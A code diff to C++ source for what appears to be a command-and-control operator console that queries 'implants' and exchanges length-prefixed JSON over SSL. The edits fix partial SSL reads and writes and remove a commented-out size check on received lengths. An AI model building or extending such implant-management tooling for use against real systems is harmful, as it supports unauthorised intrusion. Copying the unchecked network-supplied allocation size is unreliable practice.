@@ -274,7 +274,7 @@ void Shell::main_shell(Communicate com) {
 void Shell::process_shell_commands(const char* cmd, Communicate com) {
     if (strcmp(cmd, "implants") == 0) {
         char *data = com.get_info("Implants");
-        if (!data) {
+        if (data == NULL) {
             printf("\n[-] NO DATA ABOUT IMPLANTS \n");
             return;
         }
@@ -515,7 +515,17 @@ Communicate::Communicate() {
 void Communicate::send_json(const char *json_str) {
     uint32_t length = htonl(strlen(json_str)); 
     SSL_write(ssl, &length, 4);                
-    SSL_write(ssl, json_str, strlen(json_str));    
+    //SSL_write(ssl, json_str, strlen(json_str)); 
+    int sent;
+    size_t total_sent = 0;
+        size_t json_len = strlen(json_str);
+     while (total_sent < json_len) {
+        sent = SSL_write(ssl, json_str + total_sent, json_len - total_sent);
+        if (sent <= 0) {
+            break;
+        }
+        total_sent += sent;
+    }
 }
 
 char* Communicate::recv_json() {
@@ -525,24 +535,20 @@ char* Communicate::recv_json() {
 
     length = ntohl(length);
 
-    //if (length > 10*1024*1024) { // sanity check: max 10 MB
-    //    return NULL;
-    //}
-
     char *buffer = (char*)malloc(length + 1);  // heap allocation
     if (!buffer) return NULL;
 
     //char buffer[length + 0x20];
     int total = 0;
     while (total < length) {
-        int bytes = SSL_read(ssl, buffer, length -total);
+        int bytes = SSL_read(ssl, buffer + total, length -total);
         if (bytes <= 0) {
             free(buffer);
             return NULL;
         }
         total += bytes;
     }
-    //buffer[length] = '\0';  // null terminate
+    buffer[length] = '\0'; 
     return buffer;
 }
 
@@ -838,6 +844,7 @@ char* Communicate::get_info(const char* table) {
 
         char *info_container = recv_json();
         if (!info_container) return NULL;
+        //printf("%s", info_container);
         return info_container;
 }
 
